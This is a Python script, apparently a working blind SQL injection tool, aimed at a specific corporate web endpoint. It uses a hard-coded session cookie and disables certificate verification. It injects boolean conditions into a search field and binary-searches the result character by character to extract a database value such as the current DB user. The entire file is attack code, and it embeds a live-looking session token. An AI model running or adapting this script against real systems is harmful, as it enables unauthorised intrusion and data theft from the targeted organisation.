import requests
import time
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

url = "https://opmate.skcc.com/opmw/action/do_action_assignment_list"
cookie = {'session':'.eJxF0O-LgjAYB_B_5Xhex7EuDROCM3-E6bacm1wQDDPrOs0ik4rof79Zh_dmsO_neb6D3UFuTnn9DeYmLeu8B_KYn_ZplVdnMM-nRiXlYbvN13JXgXmHCaWBxBYLZMQXYKIeOO6cSzuUtgMmcBdLIRFCI1BCseWTzhxMnjZqzRPE7sQT9r8wGoadqMurDymJ3Tj2KZGcBi5RGAUsmdhD6gyFy6ZCR9RKIv0LackARVN_oJOQow8jbldxVxlj1lb2kaZyETNpUzaXRGAwq6YsX5nfTtZ51sh0vd9Vn3Xxnh32fwtEjcKyWWUbbdlkumao0-ijZZNmBoJHD86HIn_-1tuqfRAVN54cOS-SGUYF4sXlkriJz1x9wZzoKjxvQrl1ZT_enHqzKeZWn0TjMTwev4Z8eRM.F0SWJA.HeNkXZyq8dk0vWAHBHGaoL2RXOA'}  # 쿠키 값 넣기

SQL = "user()"

def find_length():
    pwlength = 10

    while True:
        param = {"btn": "assignment_list_search", "i_action_title": "' and length("+SQL+")={} or '1'='1".format(pwlength)}
        req = requests.post(url, data = param, cookies = cookie,verify=False)
        if "test" in req.text:
            return pwlength
        else:
            print(param)
            pwlength += 1
        time.sleep(0.5) # 타임슬립 추가

def find_pw():
    length = find_length()
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"btn": "assignment_list_search", "i_action_title": "' and ascii(substr("+SQL+",{},1))={} or '1'='1".format(i+1, value)}
            print(param)
            req = requests.post(url, data = param, cookies = cookie,verify=False)
            if "test" in req.text:
                password += chr(value)
                break
            else:
                param = {"btn": "assignment_list_search", "i_action_title": "' and ascii(substr("+SQL+",{},1))>{} or '1'='1".format(i+1, value)}
                req = requests.post(url, data = param, cookies = cookie,verify=False)
                if "test" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
            time.sleep(0.5)
    print("원하는 DATA는:", password)

find_pw()
